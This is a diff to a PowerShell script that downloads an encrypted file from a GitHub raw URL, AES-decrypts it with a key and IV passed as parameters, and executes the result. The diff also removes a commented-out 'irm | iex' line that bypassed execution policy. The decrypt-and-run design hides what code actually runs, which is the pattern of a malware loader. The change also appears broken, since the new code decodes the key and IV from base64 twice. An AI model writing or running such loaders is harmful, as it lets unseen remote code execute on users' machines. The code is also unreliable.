@@ -1,5 +1,12 @@
-$key_b64   = "ssoZQPYexHMdz5aziRGPSeVSPIyZAXRYO5bWjA3Fa1o="
-$iv_b64    = "dEBECw8EwscFYUj8HQt4aA=="
+param (
+    [Parameter(Mandatory=$true)]
+    [string]$Key,
+
+    [Parameter(Mandatory=$true)]
+    [string]$IV
+)
+$key_b64   = [System.Convert]::FromBase64String($Key)
+$iv_b64    = [System.Convert]::FromBase64String($IV)
 $url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.enc"
 $data_b64  = (New-Object Net.WebClient).DownloadString($url)
 $keyBytes = [System.Convert]::FromBase64String($key_b64)
@@ -13,5 +20,5 @@ $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedB
 $decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
 $aes.Dispose()
 $decryptor.Dispose()
-#Start-Process -FilePath "powershell.exe" -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.ps1" | iex' -WindowStyle Normal
-Invoke-Expression $decryptedCommand
+$scriptBlock = [scriptblock]::Create($decryptedCommand)
+Invoke-Command -ScriptBlock $scriptBlock
